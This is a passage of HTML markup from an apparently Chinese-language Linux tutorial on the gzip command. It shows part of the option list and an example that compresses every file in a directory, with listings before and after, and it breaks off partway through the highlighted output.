&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;L&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;license&lt;/span&gt; 　显示版本与版权信息。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;n&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;name&lt;/span&gt; 　压缩文件时，不保存原来的文件名称及时间戳记。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-17&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;N&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;name&lt;/span&gt; 　压缩文件时，保存原来的文件名称及时间戳记。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-19&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;q&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;quiet&lt;/span&gt; 　不显示警告信息。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-21&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;r&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;recursive&lt;/span&gt; 　递归处理，将指定目录下的所有文件及子目录一并处理。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-22&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-23&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;压缩字尾字符串&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;suffix&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;压缩字尾字符串&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt; 　更改压缩字尾字符串。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-24&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-25&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;t&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt; 　测试压缩文件是否正确无误。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-27&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;v&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;verbose&lt;/span&gt; 　显示指令执行过程。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-28&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-29&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;V&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;version&lt;/span&gt; 　显示版本信息。 &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b57431227915-30&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b57431227915-31&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;num&lt;/span&gt; 用指定的数字&lt;span class=&quot;crayon-i&quot;&gt;num&lt;/span&gt;调整压缩的速度，&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;fast&lt;/span&gt;表示最快压缩方法（低压缩比），&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;9&lt;/span&gt;或&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;best&lt;/span&gt;表示最慢压缩方法（高压缩比）。系统缺省值为&lt;span class=&quot;crayon-cn&quot;&gt;6&lt;/span&gt;。&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0048 seconds] --&gt;
&lt;p&gt;4．使用实例：&lt;/p&gt;
&lt;p&gt;实例1：把test6目录下的每个文件压缩成.gz文件&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b60846755392&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
gzip *&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b60846755392-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b60846755392-1&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;gzip&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b12c9a9b63410432658&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test6]# ll

总计 604

---xr--r-- 1 root mail  302108 11-30 08:39 linklog.log

---xr--r-- 1 mail users 302108 11-30 08:39 log2012.log

-rw-r--r-- 1 mail users     61 11-30 08:39 log2013.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2014.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2015.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2016.log

-rw-r--r-- 1 root mail       0 11-30 08:39 log2017.log

[root@localhost test6]# gzip *

[root@localhost test6]# ll

总计 28

---xr--r-- 1 root mail  1341 11-30 08:39 linklog.log.gz

---xr--r-- 1 mail users 1341 11-30 08:39 log2012.log.gz

-rw-r--r-- 1 mail users   70 11-30 08:39 log2013.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2014.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2015.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2016.log.gz

-rw-r--r-- 1 root mail    32 11-30 08:39 log2017.log.gz

[root@localhost test6]#&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b12c9a9b63410432658-39&quot;&gt;39&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;test6&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-3&quot;&gt;总计 &lt;span class=&quot;crayon-cn&quot;&gt;604&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;  &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;linklog&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;302108&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2012&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-9&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;users&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-11&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2014&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b12c9a9b63410432658-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b12c9a9b63410432658-13&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;mail&lt;/span&gt;       &lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;39&lt;/span&gt; &lt;span 